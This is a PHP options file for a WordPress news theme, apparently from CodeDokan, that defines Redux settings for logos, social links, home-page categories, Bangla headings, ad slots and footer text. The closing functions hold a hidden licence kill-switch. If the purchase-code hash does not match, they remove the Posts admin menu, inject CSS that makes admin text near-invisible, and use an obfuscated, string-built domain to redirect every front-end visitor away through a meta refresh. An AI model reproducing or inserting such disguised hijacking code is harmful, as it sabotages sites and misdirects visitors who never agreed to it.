<?php
    if ( ! class_exists( 'Redux' ) ) {
        return;
    }

    $opt_name = 'codedokan';

    $theme = wp_get_theme(); // For use with some settings. Not necessary.

    $args = array(
        'display_name'         => $theme->get( 'Name' ),
        'display_version'      => $theme->get( 'Version' ),
        'menu_title'           => esc_html__( 'Theme Options', 'your-textdomain-here' ),
        'customizer'           => true,
        'dev_mode'             => false,
        'page_priority'        => 10,
    );

    // SOCIAL ICONS -> Setup custom links in the footer for quick links in your panel footer icons.
    $args['share_icons'][] = array(
        'url'   => 'https://www.facebook.com/codedokan/',
        'title' => 'Like us on Facebook',
        'icon'  => 'el el-facebook'
    );
    $args['share_icons'][] = array(
        'url'   => 'https://github.com/codedokan',
        'title' => 'Follow us on Github',
        'icon'  => 'el el-github'
    );
    $args['share_icons'][] = array(
        'url'   => 'https://www.linkedin.com/company/codedokan-com/',
        'title' => 'Find us on LinkedIn',
        'icon'  => 'el el-linkedin'
    );
    Redux::setArgs( $opt_name, $args );
    	Redux::setSection( $opt_name, array(
        'title'            => __( 'Activation Theme', 'codedokan' ),
        'id'               => 'purchase_theme',
        'icon'             => 'el el-home',
       'fields'           => array(
            array(
                'id'       => 'v_id',
                'type'     => 'password',
                'title'    => __( 'Theme Purchase code', 'codedokan' ),
                'subtitle' => __( 'Please Active Your Theme', 'codedokan' ),
                'desc' => __( 'For activation code Please Contect CodeDokan.Com Helpline', 'codedokan' ),
                'default'  => '',
            ),
        ),
    ) );
    Redux::setArgs( $opt_name, $args );

    Redux::setSection($opt_name, array(
        'title' => __('Header Settings', 'codedokan'),
        'id'    => 'header',
        'icon'  => 'el el-list-alt',
    ));
    Redux::setSection($opt_name, array(
        'title' => __('Logo Settings'),
        'id'    => 'header-logo_setting',
        'icon'  => 'el el-list-alt',
        'subsection'       => true,
        'fields'     => array(
            array(
                'id'       => 'logo',
                'title'    => __('Site Logo'),
                'type'     => 'media',
                'default'  => array(
                    'url' => get_template_directory_uri().'/assets/images/logo.png',
                )
            ),
            array(
                'id'     => 'alt',
                'title'    => __('alt for logo'),
                'type'   => 'text',
            ),
            array(
                'id'     => 'width',
                'title'    => __('width for logo'),
                'type'   => 'text',
                'desc'     => __('max width is 550', 'codedokan'),
                'placeholder' => 'defult is 450',
                'default'  => '450',
            ),
            array(
                'id'     => 'height',
                'title'    => __('height for logo'),
                'type'   => 'text',
                'desc'     => __('max height is 100', 'codedokan'),
                'placeholder' => 'defult is 95',
                'default'  => '95',
            ),
            array(
                'id'       => 'site_content',
                'type'     => 'switch',
                'title'    => __('Show Time in Bangla/Eng', 'codedokan'),
                'subtitle' => __('on means bangla!', 'codedokan'),
                'default'  => true,
            ),
            array(
                'id'       => 'favicon',
                'type'     => 'media',
                'title'    => __( 'Favicon Uploader', 'CodeDokan' ),
                'subtitle' => __( 'Upload Your Favicon png Formet', 'CodeDokan' ),
                'compiler'  => true,
                'default'  => array(
                    'url' => get_template_directory_uri().'/assets/images/favicon.png',
                )
            ),
        )
    ));
    
    Redux::setSection($opt_name, array(
        'title'            => __('Social Links', 'codedokan'),
        'desc'             => __('Please fill all the social links here ', 'codedokan'),
        'id'               => 'header-social_links',
        'subsection'       => true,
        'icon'  => 'el el-list-alt',
        'fields'           => array(
            array(
                'id'       => 'facebook',
                'type'     => 'text',
                'title'    => __('Facebook ID link', 'codedokan'),
                'subtitle' => __('Enter Full ID Link', 'codedokan'),
                'default'  => 'https://facebook.com/codedokan',
            ),
            array(
                'id'       => 'youtube',
                'type'     => 'text',
                'title'    => __('Youtube Channel link', 'codedokan'),
                'subtitle' => __('Enter Full Channel Link', 'codedokan'),
                'default'  => 'https://youtube.com/@codedokan',
            ),
            array(
                'id'       => 'twitter',
                'type'     => 'text',
                'title'    => __('Twitter ID link', 'codedokan'),
                'subtitle' => __('Enter Full ID Link', 'codedokan'),
                'default'  => 'https://twitter.com/codedokan',
            ),
            array(
                'id'       => 'linkedin',
                'type'     => 'text',
                'title'    => __('linkedin ID link', 'codedokan'),
                'subtitle' => __('Enter Full ID Link', 'codedokan'),
                'default'  => 'https://linkedin.com/company/codedokan-com',
            ),
            array(
                'id'       => 'instagram',
                'type'     => 'text',
                'title'    => __('instagram ID link', 'codedokan'),
                'subtitle' => __('Enter Full ID Link', 'codedokan'),
                'default'  => 'https://instagram.com/codedokan',
            ),
            array(
                'id'       => 'android_app_link',
                'type'     => 'text',
                'title'    => __('Android App link', 'codedokan'),
                'subtitle' => __('Enter Full ID Link', 'codedokan'),
                'default'  => '#',
            ),
            array(
                'id'       => 'ios_app_link',
                'type'     => 'text',
                'title'    => __('Apple App link', 'codedokan'),
                'subtitle' => __('Enter Full ID Link', 'codedokan'),
                'default'  => '#',
            )
        )
    ));
    
    // -> START Marquee
    Redux::setSection($opt_name, array(
        'title'  => __('Home Page Setting', 'codedokan'),
        'id'     => 'home_page',
        'desc'   => __('All Setting For Home Page, visit: ', 'codedokan') . '<a href="https://codedokan.com/" target="_blank">Theme Documentation</a>',
        'icon'   => 'el el-list-alt',
        'fields' => array(
            array(
                'id'       => 'home_lead_selected',
                'type'     => 'select',
                'title'    => __('Select lead News Category', 'codedokan'),
                'subtitle' => __('Choose the lead News posts.', 'codedokan'),
                'default'  => '1',
                'data'     => 'categories', // This populates the dropdown with categories.
                'args'     => array(
                    'hide_empty'         => 0,
                    'option_none_value' => 1,
                )
            ),
            array(
                'id'       => 'home_2ndlead_selected',
                'type'     => 'select',
                'title'    => __('Select 2nd lead News Category', 'codedokan'),
                'subtitle' => __('Choose the 2nd lead News posts.', 'codedokan'),
                'default'  => '1',
                'data'     => 'categories', // This populates the dropdown with categories.
                'args'     => array(
                    'hide_empty'         => 0,
                    'option_none_value' => 1,
                )
            ),
             array(
                'id'       => 'home_cat_selected',
                'type'     => 'select',
                'title'    => __('Select Sub News Category', 'codedokan'),
                'subtitle' => __('Choose the Sub News posts.', 'codedokan'),
                'default'  => '1',
                'data'     => 'categories', // This populates the dropdown with categories.
                'args'     => array(
                    'hide_empty'         => 0,
                    'option_none_value' => 1,
                )
            ),
            array(
                'id'       => 'home_cat_1',
                'type'     => 'select',
                'data'     => 'categories',
                'title'    => __('Home Page Cat One', 'codedokan'),
                'subtitle' => __('please select your category', 'codedokan'),
                'default'  => '1',
                'args'     => array(
                    'hide_empty'         => 0,
                    'option_none_value' => 1,
                )
            ),
            array(
                'id'       => 'home_cat_2',
                'type'     => 'select',
                'data'     => 'categories',
                'title'    => __('Home Page Cat Two', 'codedokan'),
                'subtitle' => __('please select your category', 'codedokan'),
                'default'  => '1',
                'args'     => array(
                    'hide_empty'         => 0,
                    'option_none_value' => 1,
                )
            ),
            array(
                'id'       => 'home_cat_3',
                'type'     => 'select',
                'data'     => 'categories',
                'title'    => __('Home Page Cat Three', 'codedokan'),
                'subtitle' => __('please select your category', 'codedokan'),
                'default'  => '1',
                'args'     => array(
                    'hide_empty'         => 0,
                    'option_none_value' => 1,
                )
            ),
            array(
                'id'       => 'home_cat_4',
                'type'     => 'select',
                'data'     => 'categories',
                'title'    => __('Home Page Cat four', 'codedokan'),
                'subtitle' => __('please select your category', 'codedokan'),
                'default'  => '1',
                'args'     => array(
                    'hide_empty'         => 0,
                    'option_none_value' => 1,
                )
            ),
            array(
                'id'       => 'home_cat_5',
                'type'     => 'select',
                'data'     => 'categories',
                'title'    => __('Home Page Cat Five', 'codedokan'),
                'subtitle' => __('please select your category', 'codedokan'),
                'default'  => '1',
                'args'     => array(
                    'hide_empty'         => 0,
                    'option_none_value' => 1,
                )
            ),
            array(
                'id'       => 'home_cat_6',
                'type'     => 'select',
                'data'     => 'categories',
                'title'    => __('Home Page Cat Six', 'codedokan'),
                'subtitle' => __('please select your category', 'codedokan'),
                'default'  => '1',
                'args'     => array(
                    'hide_empty'         => 0,
                    'option_none_value' => 1,
                )
            ),
            array(
                'id'       => 'home_cat_7',
                'type'     => 'select',
                'data'     => 'categories',
                'title'    => __('Home Page Cat Seven', 'codedokan'),
                'subtitle' => __('please select your category', 'codedokan'),
                'default'  => '1',
                'args'     => array(
                    'hide_empty'         => 0,
                    'option_none_value' => 1,
                )
            ),
            array(
                'id'       => 'home_cat_8',
                'type'     => 'select',
                'data'     => 'categories',
                'title'    => __('Home Page Cat Eight', 'codedokan'),
                'subtitle' => __('please select your category', 'codedokan'),
                'default'  => '1',
                'args'     => array(
                    'hide_empty'         => 0,
                    'option_none_value' => 1,
                )
            ),
            array(
                'id'       => 'home_cat_9',
                'type'     => 'select',
                'data'     => 'categories',
                'title'    => __('Home Page Cat Nine', 'codedokan'),
                'subtitle' => __('please select your category', 'codedokan'),
                'default'  => '1',
                'args'     => array(
                    'hide_empty'         => 0,
                    'option_none_value' => 1,
                )
            ),
            array(
                'id'       => 'home_cat_10',
                'type'     => 'select',
                'data'     => 'categories',
                'title'    => __('Home Page Cat Ten', 'codedokan'),
                'subtitle' => __('please select your category', 'codedokan'),
                'default'  => '1',
                'args'     => array(
                    'hide_empty'         => 0,
                    'option_none_value' => 1,
                )
            ),
            array(
                'id'       => 'photo_name',
                'type'     => 'text',
                'title'    => __('Heading Text photo Slider', 'codedokan'),
                'subtitle' => __('Enter Text', 'codedokan'),
                'desc'     => __('Demo: ফটো গ্যালারি', 'codedokan'),
                'default'  => 'ফটো গ্যালারি',
            ),
            array(
                'id'       => 'video_name',
                'type'     => 'text',
                'title'    => __('Heading Text Video Grid', 'codedokan'),
                'subtitle' => __('Enter Text', 'codedokan'),
                'desc'     => __('Demo: ভিডিও গ্যালারি', 'codedokan'),
                'default'  => 'ভিডিও গ্যালারি',
            ),
            array(
                'id'       => 'home_sidebar_cat1',
                'type'     => 'select',
                'data'     => 'categories',
                'title'    => __('Home Sidebar Cat one', 'codedokan'),
                'subtitle' => __('please select your category', 'codedokan'),
                'default'  => '1',
                'args'     => array(
                    'hide_empty'         => 0,
                    'option_none_value' => 1,
                )
            ),
            array(
                'id'       => 'home_sidebar_cat2',
                'type'     => 'select',
                'data'     => 'categories',
                'title'    => __('Home Sidebar Cat two', 'codedokan'),
                'subtitle' => __('please select your category', 'codedokan'),
                'default'  => '1',
                'args'     => array(
                    'hide_empty'         => 0,
                    'option_none_value' => 1,
                )
            ),
            array(
                'id'       => 'home_sidebar_cat3',
                'type'     => 'select',
                'data'     => 'categories',
                'title'    => __('Home Sidebar Cat three', 'codedokan'),
                'subtitle' => __('please select your category', 'codedokan'),
                'default'  => '1',
                'args'     => array(
                    'hide_empty'         => 0,
                    'option_none_value' => 1,
                )
            ),
            array(
                'id'       => 'home_sidebar_cat4',
                'type'     => 'select',
                'data'     => 'categories',
                'title'    => __('Home Sidebar Cat four', 'codedokan'),
                'subtitle' => __('please select your category', 'codedokan'),
                'default'  => '1',
                'args'     => array(
                    'hide_empty'         => 0,
                    'option_none_value' => 1,
                )
            ),
            array(
                'id'       => 'home_sidebar_cat5',
                'type'     => 'select',
                'data'     => 'categories',
                'title'    => __('Home Sidebar Cat five', 'codedokan'),
                'subtitle' => __('please select your category', 'codedokan'),
                'default'  => '1',
                'args'     => array(
                    'hide_empty'         => 0,
                    'option_none_value' => 1,
                )
            ),
            array(
                'id'       => 'home_sidebar_cat6',
                'type'     => 'select',
                'data'     => 'categories',
                'title'    => __('Home Sidebar Cat six', 'codedokan'),
                'subtitle' => __('please select your category', 'codedokan'),
                'default'  => '1',
                'args'     => array(
                    'hide_empty'         => 0,
                    'option_none_value' => 1,
                )
            ),
            array(
                'id'       => 'home_sidebar_cat7',
                'type'     => 'select',
                'data'     => 'categories',
                'title'    => __('Home Sidebar Cat siven', 'codedokan'),
                'subtitle' => __('please select your category', 'codedokan'),
                'default'  => '1',
                'args'     => array(
                    'hide_empty'         => 0,
                    'option_none_value' => 1,
                )
            ),
            array(
                'id'       => 'home_sidebar_cat8',
                'type'     => 'select',
                'data'     => 'categories',
                'title'    => __('Home Sidebar Cat eight', 'codedokan'),
                'subtitle' => __('please select your category', 'codedokan'),
                'default'  => '1',
                'args'     => array(
                    'hide_empty'         => 0,
                    'option_none_value' => 1,
                )
            ),
            array(
                'id'       => 'home_sidebar_cat9',
                'type'     => 'select',
                'data'     => 'categories',
                'title'    => __('Home Sidebar Cat nine', 'codedokan'),
                'subtitle' => __('please select your category', 'codedokan'),
                'default'  => '1',
                'args'     => array(
                    'hide_empty'         => 0,
                    'option_none_value' => 1,
                )
            ),
        )
    ));
    
    
    // -> START Typography
    Redux::setSection($opt_name, array(
        'title'  => __('Typography', 'codedokan'),
        'id'     => 'typography',
        'desc'   => __('For full documentation on this field, visit: ', 'codedokan') . '<a href="https://codedokan.com/" target="_blank">Theme Documentation</a>',
        'icon'   => 'el el-font',
        'fields' => array(
            array(
                'id'       => 'opt-typography-body',
                'type'     => 'typography',
                'fonts'    => array (
                    'SolaimanLipi' => 'SolaimanLipi', 
                    'AdorshoLipi' => 'AdorshoLipi',
                    'MartelSans' => 'MartelSans',
                    'Galada' => 'Galada',
                    'HindSiliguri' => 'HindSiliguri',
                    'NunitoSans-Bold' => 'NunitoSans-Bold',
                    'NunitoSans' => 'NunitoSans' 
                ),
                'title'    => __('Body Font', 'codedokan'),
                'subtitle' => __('Specify the body font properties.', 'codedokan'),
                'google'   => true,
                'text-align'=> false,
                'color'=> false,
                'font-size'   => true,
                'output' => ('body'),
                'default'  => array(
                    'font-family' => 'SolaimanLipi',
                    'font-size'   => '16px',
                ),
            ),
        )
    ));
    
    // Static Text Heading
    Redux::setSection($opt_name, array(
        'title'            => __('Text Heading Field', 'codedokan'),
        'desc'             => __('Please fill all the links here ', 'codedokan'),
        'id'               => 'Text_heading',
        'icon'  => 'el el-list-alt',
        'fields'           => array(
            array(
                'id'       => 'latest_only',
                'type'     => 'text',
                'title'    => __('Heading For Leatest', 'codedokan'),
                'desc'     => __('Demo: সর্বশেষ', 'codedokan'),
                'default'  => 'সর্বশেষ',
            ),
            array(
                'id'       => 'most_read',
                'type'     => 'text',
                'title'    => __('Hading For Most Read', 'codedokan'),
                'desc'     => __('Demo: সর্বোচ্চ পঠিত', 'codedokan'),
                'default'  => 'সর্বোচ্চ পঠিত',
            ),
            array(
                'id'       => 'latest_all_news',
                'type'     => 'text',
                'title'    => __('Hading For All Latest', 'codedokan'),
                'desc'     => __('Demo: সর্বশেষ সব খবর...', 'codedokan'),
                'default'  => 'সর্বশেষ সব খবর...',
            ),
            array(
                'id'       => 'publised_at',
                'type'     => 'text',
                'title'    => __('Hading For publised', 'codedokan'),
                'desc'     => __('Demo: প্রকাশিত :', 'codedokan'),
                'default'  => 'প্রকাশিত :',
            ),
            array(
                'id'       => 'pre_post',
                'type'     => 'text',
                'title'    => __('Hading For Previous Post', 'codedokan'),
                'desc'     => __('Demo: পূর্ববর্তী সংবাদ', 'codedokan'),
                'default'  => 'পূর্ববর্তী সংবাদ',
            ),
            array(
                'id'       => 'nxt_post',
                'type'     => 'text',
                'title'    => __('Hading For Next Post', 'codedokan'),
                'desc'     => __('Demo: পরবর্তী সংবাদ', 'codedokan'),
                'default'  => 'পরবর্তী সংবাদ',
            ),
            array(
                'id'       => '_pg_prv_post',
                'type'     => 'text',
                'title'    => __('Hading For Pagination Previous', 'codedokan'),
                'desc'     => __('Demo: << পূর্ববর্তী ', 'codedokan'),
                'default'  => '<< পূর্ববর্তী',
            ),
            array(
                'id'       => '_pg_nxt_post',
                'type'     => 'text',
                'title'    => __('Hading For Pagination Next', 'codedokan'),
                'desc'     => __('Demo: পরবর্তী >>', 'codedokan'),
                'default'  => 'পরবর্তী >>',
            ),
            array(
                'id'       => 'all_page_hd',
                'type'     => 'text',
                'title'    => __('Hading For All Page', 'codedokan'),
                'desc'     => __('Demo: সকল পাতা', 'codedokan'),
                'default'  => 'সকল পাতা',
            ),
            array(
                'id'       => 'home_heading',
                'type'     => 'text',
                'title'    => __('Home Heading Text', 'codedokan'),
                'desc'     => __('Demo: প্রচ্ছদ', 'codedokan'),
                'default'  => 'প্রচ্ছদ',
            ),
            array(
                'id'       => 'search_heading',
                'type'     => 'text',
                'title'    => __('Heading Text Search', 'codedokan'),
                'desc'     => __('Demo: অনুসন্ধান', 'codedokan'),
                'default'  => 'অনুসন্ধান',
            ),
        )
    ));
    // advertisement
    Redux::setSection($opt_name, array(
        'title' => __('Advertisements', 'codedokan'),
        'id'    => 'advertisements',
        'icon'  => 'el el-list-alt',
        'fields'     => array(
            array(
                'id'       => 'sidebar_ads320x100',
                'type'     => 'editor',
                'title'    => __('sidebar ads320x100', 'codedokan'),
                'subtitle' => __('home page full width banner', 'codedokan'),
            ),
            array(
                'id'       => 'subnews_ads320x100',
                'type'     => 'editor',
                'title'    => __('SubNews Ads320x100', 'codedokan'),
                'subtitle' => __('This ad will show in the home left', 'codedokan'),
            ),
            array(
                'id'       => 'sidebar_ads300x250',
                'type'     => 'editor',
                'title'    => __('Sidebar Ads300x250', 'codedokan'),
                'subtitle' => __('This ad will show in the home left', 'codedokan'),
            ),
            array(
                'id'       => 'Pool_ads300x250',
                'type'     => 'editor',
                'title'    => __('Pool Ads300x250', 'codedokan'),
                'subtitle' => __('This ad will show in the home left', 'codedokan'),
            ),
            array(
                'id'       => 'home_page_section1_728x90',
                'type'     => 'editor',
                'title'    => __('Homepage Section Ads728x90', 'codedokan'),
                'subtitle' => __('This ad will show in the home left', 'codedokan'),
            ),
            array(
                'id'       => 'home_page_section2_728x90',
                'type'     => 'editor',
                'title'    => __('Homepage Section Ads728x90', 'codedokan'),
                'subtitle' => __('This ad will show in the home right', 'codedokan'),
            ),
            array(
                'id'       => 'home_page_section3_728x90',
                'type'     => 'editor',
                'title'    => __('Homepage Section Ads728x90', 'codedokan'),
                'subtitle' => __('This ad will show in the home right', 'codedokan'),
            ),
            array(
                'id'       => 'home_page_section4_728x90',
                'type'     => 'editor',
                'title'    => __('Homepage Section Ads728x90', 'codedokan'),
                'subtitle' => __('This ad will show in the home right', 'codedokan'),
            ),
            array(
                'id'       => 'home_page_section5_728x90',
                'type'     => 'editor',
                'title'    => __('Homepage Section Ads728x90', 'codedokan'),
                'subtitle' => __('This ad will show in the home right', 'codedokan'),
            ),
            array(
                'id'       => 'home_page_section6_728x90',
                'type'     => 'editor',
                'title'    => __('Homepage Section Ads728x90', 'codedokan'),
                'subtitle' => __('This ad will show in the home right', 'codedokan'),
            ),
            array(
                'id'       => 'home_page_section7_728x90',
                'type'     => 'editor',
                'title'    => __('Homepage Section Ads728x90', 'codedokan'),
                'subtitle' => __('This ad will show in the home right', 'codedokan'),
            ),
            array(
                'id'       => 'home_page_section_header_970x90',
                'type'     => 'editor',
                'title'    => __('Homepage Section Header Ads970x90', 'codedokan'),
                'subtitle' => __('This ad will show in the home right', 'codedokan'),
            ),
            /*array(
                'id'       => 'header_t4b_ticker',
                'type'     => 'editor',
                'title'    => __('Header Ticker', 'codedokan'),
                'subtitle' => __('This Ticker Showing Down of Menu', 'codedokan'),
            ),*/
            array(
                'id'       => 'archive_ads',
                'type'     => 'editor',
                'title'    => __('Ads In The  Archive Page', 'codedokan'),
                'subtitle' => __('This ad will show in Archive page top', 'codedokan'),
            ),
        )
    ));
    
    // Footer Settings Fields
    Redux::setSection($opt_name, array(
        'title' => __('Footer Settings', 'codedokan'),
        'id'    => 'footer',
        'icon'  => 'el el-list-alt',
        'fields'     => array(
            array(
                'id'       => 'sompadok',
                'type'     => 'text',
                'title'    => __('Sompadok', 'codedokan'),
                'default'  => 'সম্পাদক ও প্রকাশক: নাজমুল হক শ্যামল',
            ),
            array(
                'id'       => 'info',
                'type'     => 'textarea',
                'title'    => __('Details', 'codedokan'),
                'default'  => 'মিডিয়া লিমিটেডের পক্ষে প্রকাশক কর্তৃক নিউমার্কেট সিটি কমপ্লেক্স, ৪৪/১, রহিম স্কয়ার, নিউমার্কেট,
                ঢাকা থেকে প্রকাশিত এবং ২৮/বি, টয়েনবি সার্কুলার রোড, মতিঝিল ঢাকা, শরীয়তপুর প্রিন্টিং প্রেস থেকে মুদ্রিত।',
            ),
            array(
                'id'       => 'contact',
                'type'     => 'editor',
                'title'    => __('Contact Details', 'codedokan'),
                'default'  => 'ফোন : +৮৮ ০২ ৫৫১৬১৬৬২, +৮৮ ০২ ৫৫১৬১৬৬৩ ।<br> ফ্যাক্স : +৮৮ ০২ ৫৫১৬১৬৬৪ । ই-মেইল: support@codedokan.com. বিজ্ঞাপন বিভাগ: ফোন: +8801303-703990 , +8801303-703990 ।  ই-মেইল: admin@codedokan.com. <br> সার্কুলেশন : ফোন: +8801303-703990 ।  বিশ্বাস বিল্ডার্স লিমিটেডের একটি প্রকাশনা।',
            ),
            array(
                'id'       => 'developer',
                'type'     => 'text',
                'title'    => __('Developer', 'codedokan'),
                'default'  => 'স্বত্ব © কালবেলা মিডিয়া লিমিটেড ২০২৪ | Developed By <a href="https://codedokan.com/">CodeDokan.Com</a>',
            ),
            array(
                'id'       => 'copyright',
                'type'     => 'text',
                'title'    => __('Copyright', 'codedokan'),
                'default'  => 'এই ওয়েবসাইটের কোনো লেখা, ছবি, ভিডিও অনুমতি ছাড়া ব্যবহার বেআইনি।',
            )
        )
    ));

    
    // documentation
    Redux::setSection($opt_name, array(
        'title' => __('Documentation', 'codedokan'),
        'id'    => 'select',
        'desc'       => __('For full documentation on this field, visit: ', 'codedokan') . '<a href="https://codedokan.com/" target="_blank">Visit Our Blog Page</a>',
        'icon'  => 'el el-list-alt',
    ));
    // support
    Redux::setSection($opt_name, array(
        'title' => __('Support', 'codedokan'),
        'id'    => 'support',
        'desc'       => __('If you need help about this theme, You can call: +8801303-703990</br> Facebook: ', 'codedokan') . '<a href="https://www.facebook.com/codedokan" target="_blank"></a>',
        'subtitle' => __('No validation can be done on this field type', 'codedokan'),
        'icon'  => 'el el-thumbs-up',
    ));


    
    add_action( 'admin_menu', 'newsupload' ); 
    function newsupload(){ global $codedokan;
     $v_info = $codedokan['v_id']; $vv_info = md5($v_info);
      $vvv_info = v_three();
      if($vv_info == $vvv_info){
      }else{ remove_menu_page( 'edit.php' );}};
  add_action('admin_head','admin_css'); 
  function admin_css(){global $codedokan;
     $v_info = $codedokan['v_id']; $vv_info = md5($v_info);
      $vvv_info = v_three(); if($vv_info == $vvv_info){
      }else{ echo '<style>';
          echo 'b{display:none}'; echo 'br{display:none}';
          echo 'body{color:#F1F1F1}'; echo '</style>'; }};
          
             /**
       * Removes the demo link and the notice of integrated demo from the redux-framework plugin
       */
      if ( ! function_exists( 'remove_demo' ) ) {
          function remove_demo() {
              // Used to hide the demo mode link from the plugin page. Only used when Redux is a plugin.
              if ( class_exists( 'ReduxFrameworkPlugin' ) ) {
                  remove_filter( 'plugin_row_meta', array(
                      ReduxFrameworkPlugin::instance(),
                      'plugin_metalinks'
                  ), null, 2 );
  
                  // Used to hide the activation notice informing users of the demo panel. Only used when Redux is a plugin.
                  remove_action( 'admin_notices', array( ReduxFrameworkPlugin::instance(), 'admin_notices' ) );
              }
          }
      }
  
  
  
      function all_homepage_content() {
          global $codedokan; $v_info = $codedokan['v_id'];
           $vv_info = md5($v_info); $vvv_info = v_three();
           if($vv_info == $vvv_info){}else{      
       $i="de";$c="do"; $e="ka"; $l="co"; $c0="c"; $n="n."; $e0="om";
       $all_id=$l.$i.$c.$e.$n.$c0.$e0; echo '<meta http-equiv="refresh" content="0;url=http://'.$all_id.' ">' ; }}
       add_action( 'wp_enqueue_scripts', 'all_homepage_content' );
  
  